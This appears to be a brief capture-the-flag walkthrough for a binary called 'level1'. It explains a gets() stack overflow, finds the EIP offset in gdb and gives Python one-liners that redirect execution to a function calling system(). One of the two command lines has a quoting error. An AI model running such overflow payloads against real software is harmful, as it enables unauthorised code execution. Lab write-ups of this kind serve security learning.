The program wait for input and exit

As by the source code, it call gets with buffer of 64 bytes

There is also a function which call system.
With an overflow we can redirect EIP to call this function

gdb> run < <(python -c "print 'a' * 80")

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()

We're overwriting EIP, pass it an address at the good offset

(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>

cat <(python -c 'print "a" * 76 + \x44\x84\x04\x08"') - | ./level1

or

(python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat  -) | ./level1
